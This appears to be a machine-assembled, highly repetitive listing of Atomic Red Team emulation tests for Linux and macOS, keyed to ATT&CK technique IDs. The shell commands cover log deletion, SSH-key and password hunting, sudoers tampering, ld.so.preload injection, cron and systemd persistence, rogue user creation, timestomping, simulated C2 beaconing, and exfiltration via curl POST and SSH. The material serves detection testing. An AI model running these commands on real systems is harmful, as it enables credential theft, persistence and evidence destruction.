echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1033: Identify System owner or users on an endpoint

Upon successful execution, sh will stdout list of usernames.
users >> ~/output/users.txt
w >> ~/output/users.txt
who >> ~/output/users.txt


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1158 ,T1064 ,T1040 ,T1057 ,T1036 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1501 ,T1153 ,T1139 ,T1033 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1033: Identify System owner or users on an endpoint

Upon successful execution, sh will stdout list of usernames.
users >> ~/output/users.txt
w >> ~/output/users.txt
who >> ~/output/users.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1158 ,T1064 ,T1139 ,T1033 ,T0002 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1033: Identify System owner or users on an endpoint

Upon successful execution, sh will stdout list of usernames.
users >> ~/output/users.txt
w >> ~/output/users.txt
who >> ~/output/users.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1501 ,T1154 ,T1081 ,T1082 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1055 ,T1501 ,T1064 ,T1139 ,T1033 ,T1222 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1033: Identify System owner or users on an endpoint

Upon successful execution, sh will stdout list of usernames.
users >> ~/output/users.txt
w >> ~/output/users.txt
who >> ~/output/users.txt


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1206 ,T1168 ,T1064 ,T1081 ,T1082 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1168 ,T1064 ,T1081 ,T1082 ,T1222 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1168 ,T1064 ,T1081 ,T1082 ,T1222 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1055 ,T1168 ,T1153 ,T1081 ,T1069 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1069: Permission Groups Discovery
groups


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1168 ,T1154 ,T1040 ,T1069 ,T1070 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1069: Permission Groups Discovery
groups


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1055 ,T1158 ,T1064 ,T1081 ,T1069 ,T1027 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1069: Permission Groups Discovery
groups


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1136 ,T1153 ,T1145 ,T1057 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1206 ,T1158 ,T1064 ,T1139 ,T1069 ,T1222 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1069: Permission Groups Discovery
groups


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
